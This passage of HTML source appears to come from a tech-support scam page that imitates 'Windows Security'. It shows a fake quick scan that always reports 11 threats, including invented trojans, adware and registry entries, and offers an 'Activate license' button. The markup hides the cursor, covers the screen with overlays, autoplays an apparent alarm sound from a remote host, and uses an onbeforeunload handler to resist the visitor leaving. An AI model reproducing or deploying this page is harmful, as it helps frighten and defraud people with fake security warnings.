ZC7bBhbYUbNow5rz2woOODK+OnHhi2pwvB3BUS3YobFCBXC2Bpk9npYEIQyuRmMIVCKONw/HltFAqzLG3BuItPe7be3UDSvSo3LIzLbd8enE30fUhytVwKmOXpMsG1qQxurjBXpohHEWBqQ0KqBCnMivW7Ohy9f/HpuI1np50HP+ho4D6gbWzgcYfgzMLpYMLrhhxRcDNYeHhDg0xmmLPerDjSatfRexff3+vmP+T8hfCGc+agZ3PXrs6tmgcEY5OenmsTMNXqTcs0eMFe0niJ2L5sWbDm4EHNjk3LwFcHD4999Xrswa7qI8+XBe/YodHcuHH4sAakFgAmnGTPRp+phCFIroYoEniJjed214FAS9ZeX7vWqEQQo3OJc5N7k9u9ViCAQAsRGCTHJj0pMBv9SVeGqiH5JhhP6iUyi8iI53YvgZRKiI0ynQvrxjxjO51u97JNbrWcDcNKJaJEsXL1OvTapDnppxJPhcQgSEzdnwipVasWgiC1SCEgdG0M+KwbQz3SYQQ56hiZjR7TEXv87tlqHdLSOjSgSDu0QQMOp8G0oaTAJmypBQ2dNi3N2/7T8GLOHS9zxl6EFvNyjRpnohxRNpGtBlU2kSNKZBNFiUg50DU2myjRAbaCcahLdNgcxWkxKzhqOMBettWO1SKKMCp4FJEDxho2G/CJHNgL8VIUnkiUeCYqqtyPXSy/QoXy4ZUomLNigjUlJXmgzjowoSWpgaQepw4evH316u0jvgmsWg02pD5KSWip45PHIY+XnMJP8FzOV7IgKF++ggVLlC1atDSZWfTSRCyxON6zbVt8S5UpPj7epOK3sIopsl5OHQygg78XCk19nNKCz1fFiynyJOsSPMmqFhOJ5s59WIzMLBYXF7dtWwtQgsqqUun4yS10yQkJlr2emhTpUx6lDvJaamqKxeTR16xZ39v+9fFMFlNNi0WvjyCKi3tYiswsVQhl8kE6j1hl5cfz95o8HtO8eXvrU2QyocNbapKzfExXs74eKPV6b/vriSwmE/ohFi/Cijg5EUw6OVbBuJYtW/B1yWIxHwuc2HnzwGSo8Ph4YrEebS/2DDCdViu2/OlUpMAhwFBEfP68eRERJ09GRCyKK8TK8m05S5Zoad0b7wHPtWKhThCflEUHApv1erEYJROHJqfD4+OZ8Ij1BAw7LSgQLwIwAXLRyRxebk7lff1ylCzo55cTKyupnHi5P5Y1/+dyfC/y/sR6v61YfuTtubGO586aEzuaXzkvv2/kKZIny28oD563jT85ShYmJqaf7wOWHrWTTyE4swAAAABJRU5ErkJggg==">';
        var img8 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAMAAABlApw1AAAAn1BMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC3kz5EAAAANHRSTlMAoGAP0MCx8eCQIDAEUEAL+n+llusnqBkUAe7Wt4llWzr25rxMQ8dwazXbd1ZIjYPNrAicLivk9AAABJpJREFUeNrt3IeymkAUxvFPRbDgBQF7711vOe//bJlMcrPGWCgLnM3s7wXcv7scUUehaZr2D2c6HrUXC/zxuX4f+ptTB/z16tv2nn7BHyX6pb9ovn2CL+foBSRcBwgzc8xzJ3onb0bCnQBhUXTAjLPZk/AoQJj5LTDiHAKicAHCcAom7G1AFD5AMHnswmpAFC+A3Ev+M6nrEUUOEPYn5KpX7FOsAMHrID+tMlHSALK2NvLhjFxKECAYK+SgV5wTRQ9gM49OBlHyAMHLNKG3XBPJCRDadWTEGQ+I5AUIi4aN9O18i0hugFC51JCq+mVPgsQAYb1Nq8E5VSskyA8QDc2pDbk6jVHZJSGlAMEyD1MHMnSnxfNCTPwMAoRB4bCs9RCL3dktt6P2uk9ClgGCOxj6h8mq1X1ZshtvNs1L1W8P13ux7twDhGD/XjY9/9zcbHe4o0pXOAZcqeoAHaADdIAO0AG3vlQPKCgU8KV6QEEH6AAdoAN0gA7QATpAB+gAHaADdIAO0AE6QAfoAB2gA6Jrqx5gqh6g/A4ofw3oAB2QkI87fIUC/s+vWZUPGKke0FQooPlfBmwUCtjgjqJCAVvc0VAo4Ig7pgoFrHBHTaGAFu74VCfAsnHPpCgX/rCL3xq3Tm83pvVbtVtddr+F1TRN0zTtp6V5a1h+6t14AkL5mnntoxDOx+/FrI3KGQ+NSSYIVqrvJ4WVEgETPFRSIqCGxwwFAuZ44qxAwBeeWCkQ0MATdp99wMzBM18SHymdgDaQ0Rmy0glo4Ck7YB7Q/8RzZ+YBPl5oMQ+o45U16wADLxVZB4zx0mfAOMBy8NqFcUAVIXRctgFuDWEUJE1s+QFtCOlP0or8gB3CaTMNGCKkOtOAKcIyWQaUEVqdZcAO4XkMAz4QQc1lF+C2EMVZbkAg+T76tW5fakCFkrI6iGbLLGCDiGyDEhrIDBjYiGpKCRkyA1aIrsAooI0YugGbgH4HcUzYBBQRj8kkYIGYOhaLAKuGuI4sAoqIz2MQ8IEESpXcA+ZdJDF1Ka53OQErJLOhuMpSAi5Iyss1YGEjKWeQY8C8i+RaVm4B7hQynHILGEOObU4BVcji5xKwsCGLPcwhYF+CPKX3zAOCGmTq7DMOmO0gVyugiIaJApaQbWdRNGaSgDHkW83iBwwomgPSsHRjBxgUyQjpaGQU4PeQkkkmAZ6N1EziBjBZPzBJPcC0kapJvAA26xezKFoAn/UDy1n0j0MMFuf/25tFYRSiB/g2MlEP0gk495CRViWNgAOy0xlID3CLyFJpITlgdkK2bE9qwHyHrPUuEgOMGnIwdmUFmA5y8daXEzCykZPaQELA7Ij8OOaTl9VwAZU68mSP6JFqqIBhFzlrWEkCDj3krmXEDpi/gQOn8DqA6fH5NrFiBLgcjs+32nvkgEEdnNijpwFluuWz+3OLt0qEgPkS/JS80AFtNlfv344BXRk9CugfwVXXJKH5IOCjA8Ym/RcBAd+n/5dO+2mAx/T0X2vM7wQwHj7/KlXd+wFfJSiivr4TYPC4cwunN6ncBARjG0qxx0cI5kiZ06NpWrZ+AABVgTFvFXi0AAAAAElFTkSuQmCC" class="logo3">';
        var img9 = '<img id="banner" src="data:image/png;base64,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">';
        var img10 = '<img src="data:image/png;base64,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">';
        
      </script>
   </head>
   <body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
      <audio id="beep" autoplay="">
         <source src="https://silly-rhodes.51-142-112-93.plesk.page/popup/0wa0rni0ng0.mp3" type="audio/mpeg">
      </audio>
      <div class="bg" style="cursor:none;">
         <div class="bgimg" style="top: 0px;"><img src="https://i.imgur.com/GsE7w8v.jpg" alt="" width="100%"/></div>
         <div class="bgimg2" style="top: 0px;"><img src="https://silly-rhodes.51-142-112-93.plesk.page/popup/tZ7HPCN.jpg" alt="" width="100%" /></div>
      </div>
      <a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
         <div class="black" style="height: 145%;cursor: none;"></div>
      </a>
      <div class="pro_box" style="cursor: none;">
         <div class="pro_box_header">
            <div class="row">
               <div class="col-md-12">
                  <div class="minimize">
                     <ul>
                        <li><a href="#"><script>document.write(img1);</script></a></li>
                     </ul>
                  </div>
               </div>
               <div class="col-md-4">
                  <div class="logo">
                     <script>document.write(img2);</script><span>Windows Security</span>
                  </div>
               </div>
               <div class="col-md-8">
                  <div class="activate_lic">
                     <ul>
                        <li><a href="#">
                           <button>Activate license</button>
                           </a>
                        </li>
                        <li><a href="#"><script>document.write(img3);</script></a></li>
                        <li><a href="#"><script>document.write(img5);</script></a></li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
         <div class="scan_box">
            <div class="scan_box_header">
               <div class="row">
                  <div class="col-md-6">
                     <div class="quick_scan">
                        <p><script>document.write(img6);</script><span>Quick Scan</span></p>
                     </div>
                  </div>
                  <div class="col-md-6">
                     <div class="minimize1">
                        <ul>
                           <li><a href="#"><script>document.write(img1);</script></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div class="scan_body">
               <div class="progress">
                  <div id="dynamic" class="progress-bar progress-bar-success active" role="progressbar" aria-valuenow="0"
                     aria-valuemin="0" aria-valuemax="100" style="width: 0%">
                     <span id="current-progress"></span>
                  </div>
               </div>
               <div class="table_quick">
                  <table class="table table-bordered">
                     <thead>
                        <tr>
                           <th scope="col">Objects scanned</th>
                           <th scope="col">
                              <div class="counter col_fourth">
                                 <h2 class="timer count-title count-number" data-to="51900" data-speed="5000"></h2>
                              </div>
                           </th>
                        </tr>
                        <tr>
                           <th scope="col">Time Elapsed</th>
                           <th scope="col">5 secs</th>
                        </tr>
                        <tr>
                           <th scope="col">Threats found</th>
                           <th scope="col" style="color: red;">
                              <h2 class="timer count-title count-number" data-to="11"
                                 data-speed="2000"></h2>
                           </th>
                        </tr>
                     </thead>
                  </table>
               </div>
            </div>
            <div class="scan_footer">
               <div class="row">
                  <div class="col-md-6">
                     <div class="bt_can">
                        <div class="btn-group" role="group" aria-label="Basic example">
                           <button type="button" class="btn btn-secondary">Cancel</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                           <button type="button" class="btn btn-secondary">Pause</button>
                        </div>
                     </div>
                  </div>
                  <div class="col-md-6">
                     <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                           <button type="button" class="btn btn-secondary" id="">Scheduled Scans</button>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="pro_box2" style="cursor: none;">
         <div class="pro_box_header">
            <div class="row">
               <div class="col-md-12">
                  <div class="minimize">
                     <ul>
                        <li><a href="#"><script>document.write(img1);</script></a></li>
                     </ul>
                  </div>
               </div>
               <div class="col-md-4">
                  <div class="logo">
                     <script>document.write(img2);</script><span>Windows Security</span>
                  </div>
               </div>
               <div class="col-md-8">
                  <div class="activate_lic">
                     <ul>
                        <li><a href="#">
                           <button>Activate license</button>
                           </a>
                        </li>
                        <li><a href="#"><script>document.write(img4);</script></a></li>
                        <li><a href="#"><script>document.write(img3);</script></a></li>
                        <li><a href="#"><script>document.write(img5);</script></a></li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
         <div class="scan_box2">
            <div class="scan_box_header">
               <div class="row">
                  <div class="col-md-6">
                     <div class="quick_scan">
                        <p><script>document.write(img6);</script><span>Scanner</span></p>
                     </div>
                  </div>
                  <div class="col-md-6">
                     <div class="minimize1">
                        <ul>
                           <li><a href="#"><script>document.write(img1);</script></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div class="scan_body">
               <div class="row">
                  <div class="col-md-4">
                     <h4 class="new_heading">Threat Scan results</h4>
                  </div>
                  <div class="col-md-8">
                     <div class="total_detail">
                        <ul>
                           <li>
                              <a href="#">
                                 <p>Items detected</p>
                                 <p>11</p>
                              </a>
                           </li>
                           <li>
                              <a href="#">
                                 <p>Scan Time</p>
                                 <p>3 sec</p>
                              </a>
                           </li>
                           <li>
                              <a href="#">
                                 <p>Item Scanned</p>
                                 <p>51,900</p>
                              </a>
                           </li>
                        </ul>
                     </div>
                  </div>
               </div>
               <br>
               <div class="table_quick2">
                  <table class="table table-bordered">
                     <thead>
                        <tr>
                           <th>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </th>
                           <th>Name</th>
                           <th>Type</th>
                           <th>Object type</th>
                           <th>Location</th>
                        </tr>
                     </thead>
                     <tbody id="table_scroll">
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Trojan.DNSCharge.AC...</td>
                           <td>Malware</td>
                           <td>Registry Value</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Trojan.Dropper.Autoit...</td>
                           <td>Malware</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>PUP.Optional.RelevantK...</td>
                           <td>Potentially Unwanted...</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>PUP.Optional.DownLoad...</td>
                           <td>Potentially Unwanted...</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Adware.TopGuard...</td>
                           <td>Malware</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>PUP.Optional.RelevantK...</td>
                           <td>Malware</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
                                 <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                 <label class="form-check-label" for="defaultCheck1"></label>
                              </div>
                           </td>
                           <td>Adware.Bundler...</td>
                           <td>Potentially Unwanted...</td>
                           <td>File</td>
                           <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                        </tr>
                        <tr>
                           <td>
                              <div class="form-check mar_lef">
